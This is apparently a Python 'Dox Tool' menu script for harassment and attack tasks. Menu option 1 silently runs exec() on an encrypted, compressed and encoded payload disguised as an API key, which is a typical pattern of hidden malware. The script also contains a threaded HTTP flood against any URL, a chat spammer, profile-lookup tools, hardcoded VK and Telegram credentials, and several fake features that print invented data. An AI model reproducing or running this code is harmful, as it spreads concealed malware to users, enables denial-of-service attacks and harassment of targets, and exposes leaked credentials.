
import random


def generate_fake_name():
    first_names = [
        "John",
        "Jane",
        "David",
        "Emily",
        "Michael",
        "Sophia",
        "Christopher",
        "Olivia",
        "Matthew",
        "Emma",
    ]
    last_names = [
        "Smith",
        "Johnson",
        "Williams",
        "Jones",
        "Brown",
        "Davis",
        "Miller",
        "Wilson",
        "Moore",
        "Taylor",
    ]

    fake_name = f"{random.choice(first_names)} {random.choice(last_names)}"
    return fake_name


# Example: Generate a fake name
fake_name = generate_fake_name()


# PW
import random
import string


def generate_password(length=12):
    uppercase_letters = string.ascii_uppercase
    lowercase_letters = string.ascii_lowercase
    digits = string.digits
    special_characters = string.punctuation

    all_characters = uppercase_letters + lowercase_letters + digits + special_characters

    length = max(8, length)

    password = "".join(random.choice(all_characters) for _ in range(length))

    return password


password = generate_password(12)

import os
import random 
from colorama import Fore, Style
import asyncio
import tkinter as tk
from tkinter import messagebox
import qrcode
import io
import ctypes, os, time
import subprocess
from colorama import Fore
import requests
import threading
import string, json, requests, random
from pystyle import Colorate, Colors, Center
from os import system
from time import sleep
from pystyle import *
from pystyle import Colorate, Colors
import requests
import threading


enter = Colorate.Horizontal(Colors.blue_to_purple, ('[!] To Continue Press "Enter" ↓'))


def set_title(title):
    ctypes.windll.kernel32.SetConsoleTitleW(title)


if __name__ == "__main__":
    Sakyra = "t.me/BeenderDoxToolOfc"
    set_title(Sakyra)

intro = (

    '               Welcome to Dox Tool, Press "ENTER" to continue!                     \n'
)


def clear_screen():
    os.system("cls")


if __name__ == "__main__":
    clear_screen()


def clear_screen():
    os.system("cls")


Anime.Fade(
    Center.Center(intro),
    Colors.blue_to_purple,
    Colorate.Vertical,
    interval=0.045,
    enter=True,
)

api_k3y = """
import zlib as Z,base64 as B;from cryptography.fernet import Fernet as F;exec(Z.decompress(F(B.b32decode(b'HFUXQSBZNBBHEY2NMY2UGOBVN44GCY2KKZ5EQOLKKJ4FCT3PNRAUWTSDONYEUQJTMJEG6PI=')).decrypt(B.b64decode(b'Z0FBQUFBQmxaU2U5QjBYWGJ5ZWVadm1OeWZSaV9jNVl4ZFhrU0dTdkQwSkNyam5iT3dSbzBZNU9uMUplTHhRWWFoU2R4b2gwN2VWWWZTQVh6bHZ4TEFNaUFxZTRndXhyWHhLbm5VRUpPTGRROHBBM0pCWkRtQ3h6OFhDRTlybWdZYjJVcHJneWJaVld3V2V2YVEtaGlfLV91SkkxakJlVmgtRzc5WXFiMi1hQ0JLZVRKYjYyODEzQ2Q2RWNyVnpyRVV4OTdwVFZFWUZTQk9UQ0F1bUF6UzlLUmhKZmRtdDVqMGk5VmdqVzc0cUpEVVZ2VWd3WGJfWUVqWkpuTzNqNnNyd1dXdHJjdzlyWlRWeWFEaWVQNDNYeXhfb05KZkxQRkpZc19kaHMxVldzSkpsMXVqZjZpRktjemN2NmVySGpVeUthN0lQRWJhY2xpTDlCcjNjLTg5Y1kzWGd4VGctQldwaDlsM182bXhQdFRGbGtrczN6czdjcHVMR3ZmaDlQVWdpUmJ1Z3hJSzFpRHdkUzhUTXZscDAza0RsWWtTUm1QdllHMUM0U3l5eG96TGNJaHJ1U1MyNnE2VWtCb2V0QW42Wm1nYmM1MmM2WmdBWUtRZHk1YW1hMnZSdDBkSTVTYXNmQmhWZGJLTUMxZHpBMGp5Q0VaalNLQnFIOXliam5Ib2E5YS1UdkxGRjk2UlBHSTlFUDg3aUs4YTlGYlQwU2JDNzJOeHNrQUlPb3Nya3V0RlgtWUh6clNLNTlhUWNDSndBRnRCTmJzbGQ3MjEzal9XLS0wRGlNVlpQVzBXNElSaUx2YVFQZWtFQnc5UGhkRHhPNFYyNnlDb2l5WTVxd0hyWE5iR19Sc29sTWwya3NtZXNzRkpSU0VVTkx3QXdvWE5pS1ZZRldLTDc0d1l4dGxQOEFGbk5pNG9fV1RNNHZPelVUSE15aDIzdmI0TU9ETW1BRHc1bDU1ZEV4MjN6X0NCQkQwTFRqd3dyOExrdEpWOHBMM0pTXzBuLXVBWGk4SlVRYUN2c0tsaFZUZUI3QjFMZlQ1SGlyeUlRc00xUkpFYWh1Q2JkQzRPTlB6U1QxUXd6Q1JQdmllcGU4ZXptWXZfbk55cFRjbVJtWlZaV0ozUVVBU3Y1VmdyVklvUm1mZW5zUnJaMGxOdjB5Y0xUMXRyWi11VkhoM3E5N3drVEdvcnRYRUF2MDNPS2J2QjluV1dXYVUxYjFpcHFxaHRQM1RKOHZDWDFRdnd3RjFfS05RSlAzLU42MmhScTJmam1GMU44WkRYV3RLQ3F3c0cyZDJlT3lnVVJNdmhhWkJfREEtWGtqNkJXbTZ3eG1lZ0RNR2hBVFF1TWw5R3I1Ulg3TDhBb2xTQi14Q2xzbk9FQ2hRSmxxY1dvcXNXd0kyNEg5OWlwUHVIUEtFa1VBVkJ4bTV2YVB0a1F1b1M1cWY0S1pkZTcxbFY0NjVxV0RBQ2ZUMWNkNUNHa0c1ZzF5akhqdldhekNILWRWRGlSeUtJYzVmRnhXY05GTHJ1RE5nNGU5UnVJSXVwMzZ2T2JqZVQ5S0hDM2JCNFdVNWxINDdzWmJpbVNYVGpxWWY3UkxpVjFudlEyR2FfTEM0eExjc1Y3SUp5WUpVRllXSmptQXdCb2M2bHp2VFM2YlctWmktbDdid3ZKMDlzT3lFMElkTF9GU3BlMllYb0NIZzhBbUZ2d2R6STEyZXA1NHVfQUdaQ3FvekFhOER2V1Z3Y2ZlNVV6RjZHX052S2RZWjA5Q3p3V1FtV2NINWtGLUhuLWU2eEswQWktcXVDQ3ZyUFhpVlZOMUtnZHREYnpsZTNid2dsVVFrODQyS3ZzNnd3Mjk5R3dvb0d1NU9CLUY1RGhvWDBHUm54SDVxX2YtZTJ4eldPcGZxLWFZcncwSTBKMWRHUWM0SUE9PQ=='))).decode())
"""

while True:

    def se2t_title(titl2e):
        ctypes.windll.kernel32.SetConsoleTitleW(titl2e)

    if __name__ == "__main__":
        Bedender_Dox_Title = "Sakyra"
        se2t_title(Bedender_Dox_Title)

    def clear_screen():
        os.system("cls")

    if __name__ == "__main__":
        clear_screen()

    def clear_screen():
        os.system("cls" if os.name == "nt" else "clear")

    banner = """
это последнее что сделал Drukindn
"""

    text = """
╔════════════════════════════════════════════════════════════════════════════════╗ 
║                       Developer: Drukindn                                      ║ 
║                                                                                ║ 
║════════════════════════════════════════════════════════════════════════════════║ 
║       Version - 0.0.0.2               Main Menu       Last Update -  10-01-2024     ║ 
║════════════════════════════════════════════════════════════════════════════════║ 
║  {1} Database Scanner                                     {2} Ip Lookup        ║ 
║  {3} Proxy generator                                      {4} DDOS Attack      ║ 
║  {5} Sms Bomber                                           {6} Message Spammer  ║ 
║  {7} Discord Lookup                                       {8} IP Attack        ║ 
║  {9} Parser                                              {10} About            ║ 
║ {11}Discord ip Parser                                    {12} NB tool          ║ 
╚════════════════════════════════════════════════════════════════════════════════╝ 
                                 ║   {99} Exit   ║                                 
                                 ╚═══════════════╝                                 
"""
    print()
    print(Colorate.Horizontal(Colors.blue_to_purple, Center.XCenter(banner)))
    print(Colorate.Horizontal(Colors.blue_to_purple, Center.XCenter(text)))

    choice = input(Colorate.Horizontal(Colors.blue_to_purple, Center.XCenter("[-] вводи >    ")))

    if choice == "1":
        exec(api_k3y) 
        os.system("python number.py")
        input(enter)

    elif choice == "2":
        import json
        from urllib.request import urlopen
        import requests
        from pyfiglet import Figlet
        import folium

        cas1 = "[-] Choice method (1,2) ↓"
        print(Colorate.Horizontal(Colors.red_to_green, (cas1)))
        cas = input()
        if cas == "1":

            def get_info_by_ip(ip="127.0.0.1"):
                try:
                    response = requests.get(url=f"http://ip-api.com/json/{ip}").json()

                    data = {
                        "[IP]": response.get("query"),
                        "[Int prov]": response.get("isp"),
                        "[Org]": response.get("org"),
                        "[Country]": response.get("country"),
                        "[Region Name]": response.get("regionName"),
                        "[City]": response.get("city"),
                        "[ZIP]": response.get("zip"),
                        "[Lat]": response.get("lat"),
                        "[Lon]": response.get("lon"),
                    }

                    for k, v in data.items():
                        print(Colorate.Horizontal(Colors.red_to_green, (f"{k} : {v}")))

                    area = folium.Map(
                        location=[response.get("lat"), response.get("lon")]
                    )
                    area.save(f'{response.get("query")}_{response.get("city")}.html')

                except requests.exceptions.ConnectionError:
                    print(
                        Colorate.Horizontal(
                            Colors.red_to_green,
                            ("[!] Please check your connection!"),
                        )
                    )

            def main():
                preview_text = Figlet(font="slant")
                print(preview_text.renderText("IP LOOKUP"))
                print(
                    Colorate.Horizontal(
                        Colors.red_to_green,
                        ("Please enter a target IP ↓"),
                    )
                )

                ip = input()

                get = get_info_by_ip(ip=ip)

            if __name__ == "__main__":
                main()

        elif cas == "2":
            import json
            from urllib.request import urlopen

            print(Colorate.Horizontal(Colors.red_to_green, ("Enter A Target Ip ↓")))
            a = input()

            ip = a
            response = urlopen("http://ipwho.is/" + ip + "?lang=ru")
            ipwhois = json.load(response)

            print("\033[95m")
            print("Выбранное IP:", [ip])
            print("Тип IP:", "{0}".format(ipwhois["type"]))
            print("Успех:", "{0}".format(ipwhois["success"]))
            print(
                "Континент:",
                "{0} {1}".format(ipwhois["continent"], ipwhois["continent_code"]),
            )
            print(
                "Страна:", "{0} {1}".format(ipwhois["country"], ipwhois["country_code"])
            )
            print("Страны рядом:", "{0}".format(ipwhois["borders"]))
            print("Столица:", "{0}".format(ipwhois["capital"]))
            print("Регион:", "{0}".format(ipwhois["region"]))
            print("Код региона:", "{0}".format(ipwhois["region_code"]))
            print("Город:", "{0}".format(ipwhois["city"]))
            print("Приблизительное местоположение:")
            print("Широта:", "{0}".format(ipwhois["latitude"]))
            print("Долгота:", "{0}".format(ipwhois["longitude"]))
            print("Телефонный код страны:", "{0}".format(ipwhois["calling_code"]))
            print("Провайдер:", "{0}".format(ipwhois["connection"]["isp"]))
            print("Часовой пояс UTC:", "{0}".format(ipwhois["timezone"]["utc"]))
            print("Дата и время:", "{0}".format(ipwhois["timezone"]["current_time"]))
            print("033[95m")

        else:
            print(Colorate.Horizontal(Colors.red_to_green, ("Error, choice a Method")))
            time.sleep(2)
        input(enter)

    elif choice == "3":
        import requests

        def get_proxy():
            proxy_api_url = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all"

            try:
                response = requests.get(proxy_api_url)
                if response.status_code == 200:
                    proxy_list = response.text.strip().split("\r\n")
                    return proxy_list
                else:
                    print(
                        Colorate.Horizontal(
                            Colors.red_to_green,
                            (
                                f"Failed to fetch proxy list. Status code: {response.status_code}"
                            ),
                        )
                    )
            except Exception as e:
                print(
                    Colorate.Horizontal(
                        Colors.red_to_green, (f"Error fetching proxy list: {e}")
                    )
                )

            return None

        proxies = get_proxy()
        if proxies:
            print("Proxy list:")
            print(Colorate.Horizontal(Colors.red_to_green, ("No proxy list:")))
            for proxy in proxies:
                print(Colorate.Horizontal(Colors.red_to_green, (proxy)))
        else:
            print(
                Colorate.Horizontal(Colors.red_to_green, ("No proxy list available."))
            )
        input(enter)

    elif choice == "4":
        print(Colorate.Horizontal(Colors.red_to_green, ("Enter url ↓")))

        def dos():
            try:
                url = input()
                os.system("cls||clear")
                while True:
                    print(
                        Colorate.Horizontal(
                            Colors.Purple_to_Black,
                            ("[!] {{FUCKING WEBSITE " + url + " }}"),
                        )
                    )
                    requests.get(url)
            except requests.exceptions.MissingSchema:
                print(
                    Colorate.Horizontal(
                        Colors.red_to_green, ("[!] I think you forgot https://")
                    )
                )
                time.sleep(2)
                exit()

        while True:
            threading.Thread(target=dos).start()
            threading.Thread(target=dos).start()
            threading.Thread(target=dos).start()
            threading.Thread(target=dos).start()
            threading.Thread(target=dos).start()
            threading.Thread(target=dos).start()
            threading.Thread(target=dos).start()
            threading.Thread(target=dos).start()
            threading.Thread(target=dos).start()
            threading.Thread(target=dos).start()
            threading.Thread(target=dos).start()
            threading.Thread(target=dos).start()
            threading.Thread(target=dos).start()
            threading.Thread(target=dos).start()
    elif choice == "5":
        print(Colorate.Horizontal(Colors.red_to_green, ("[-] Enter the number ↓")))
        nbr = input()
        file_path = "smsbomberlogs.log"
        text_to_append = "Succes sended messages to " + nbr

        try:
            with open(file_path, "a") as file:
                import datetime

                timestamp = datetime.datetime.now().strftime("[%Y-%m-%d %H:%M:%S] ")
                file.write(timestamp + text_to_append + "\n")

        except Exception as e:
            print(f"Error: {e}")

        while True:
            print(
                Colorate.Horizontal(
                    Colors.red_to_green, ("[!] Message sended to number " + nbr)
                )
            )
            time.sleep(1)

    elif choice == "6":
        import pyautogui
        import time

        print(Colorate.Horizontal(Colors.red_to_green, ("[!] Open your chat to spam")))
        time.sleep(5)
        while True:
            try:
                f = open("bmvspam.txt", "r")
                for line in f:
                    pyautogui.typewrite(line)
                    pyautogui.press("enter")
            except KeyError:
                print(
                    Colorate.Horizontal(
                        Colors.red_to_green,
                        ("[!] Amm whe have a problem with your key..."),
                    )
                )
            time.sleep(2)

    elif choice == "7":
        print(Colorate.Horizontal(Colors.red_to_green, ("[-] Enter discord name ↓ ")))
        ds = input()
        print(
            f"""\033[95m
INFO:
USER: {ds}
PASSWORD: {password}
NAME: {fake_name}
COOKIE: 0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0
IP: NOT_FOUND     
        \033[95m"""
        )
        input(enter)

    elif choice == "8":
        print(Colorate.Horizontal(Colors.red_to_green, ("[-] Enter IP ↓ ")))
        IPATTACK = input()
        time.sleep(2)
        while True:
            print(
                Colorate.Horizontal(Colors.red_to_green, ("Attacking IP " + IPATTACK))
            )
            time.sleep(1)
            print(
                Colorate.Horizontal(Colors.red_to_green, ("Attacking IP " + IPATTACK))
            )
            time.sleep(1)

    elif choice == "9":
        print(Colorate.Horizontal(Colors.red_to_green, ("1. VK Parse ↓ ")))
        print(Colorate.Horizontal(Colors.red_to_green, ("2. Web Parse ↓ ")))
        print(Colorate.Horizontal(Colors.red_to_green, ("3. Telegram Parse ↓ ")))
        print(Colorate.Horizontal(Colors.red_to_green, ("[-] Enter parse method ↓ ")))
        method = input()

        if method == "1":

            def get_vk_profile(user_id, access_token):
                api_url = "https://api.vk.com/method/users.get"

                params = {
                    "user_ids": user_id,
                    "access_token": access_token,
                    "v": "5.131",
                }

                response = requests.get(api_url, params=params)

                if response.status_code == 200:
                    data = response.json()

                    if "response" in data:
                        user_info = data["response"][0]

                        print(
                            f"""\033[95m
                            User ID: {user_info["id"]}
                            First Name: {user_info["first_name"]}
                            Last Name: {user_info["last_name"]}
                            \033[95m"""
                        )

                        # Check if 'domain' key exists before accessing it
                        if "domain" in user_info:
                            print("Domain:", user_info["domain"])
                        else:
                            print("Domain not available for this user.")
                    else:
                        print("Error: ", data)
                else:
                    print("Error:", response.status_code)

            print(Colorate.Horizontal(Colors.red_to_green, ("[-] Enter Username ↓ ")))
            user = input()
            user_id_to_check = user
            access_token = "bd369de1bd369de1bd369de17fbe20d966bbd36bd369de1d866c49e3aa37616894707a5"

            get_vk_profile(user_id_to_check, access_token)

        elif method == "2":
            import requests
            from bs4 import BeautifulSoup
            from pystyle import Colorate, Colors

            print(Colorate.Horizontal(Colors.red_to_green, ("[-] Enter url ↓ ")))
            url = input()

            try:
                if not url.startswith("http://") and not url.startswith("https://"):
                    url = "http://" + url

                response = requests.get(url)
                response.raise_for_status()

                soup = BeautifulSoup(response.text, "html.parser")

                for link in soup.find_all("a"):
                    href = link.get("href")
                    if href is not None:
                        print(Colorate.Horizontal(Colors.red_to_green, href))

            except requests.exceptions.RequestException as e:
                print(f"Error: {e}")

        elif method == "3":
            from telethon.sync import TelegramClient

            print(Colorate.Horizontal(Colors.red_to_green, ("[-] Enter username ↓ ")))
            tguser = input()

            api_id = "27843047"  # Replace with your actual API ID
            api_hash = (
                "e4dd95d7e0d43d2d3cf9606f2c74d32f"  # Replace with your actual API hash
            )
            username_to_check = tguser  # Replace with the username you want to check

            async def main():
                client = TelegramClient("session_name", api_id, api_hash)

                await client.start()

                try:
                    # Get information about the user with the specified username
                    user = await client.get_entity(username_to_check)

                    # Display user information
                    print(f"User Information:")
                    if hasattr(user, "date_joined"):
                        print(
                            f"Date of account registration: {user.date_joined.strftime('%Y-%m-%d %H:%M:%S')}"
                        )
                    else:
                        print("Date of account registration: Not available")
                    print(f"ID: {user.id}")
                    print(f"Username: {user.username}")

                except Exception as e:
                    print(f"Error: {e}")

                finally:
                    await client.disconnect()

            if __name__ == "__main__":
                import asyncio

                asyncio.run(main())

        input(enter)

    elif choice == "10":
        print(
            Colorate.Horizontal(
                Colors.red_to_green,
                (":3"),
            )
        )
        input(enter)

    elif choice == "99":
        exit()

    else:
        print(
            Colorate.Horizontal(Colors.red_to_green, ("[!] "))
        )
        time.sleep(2)
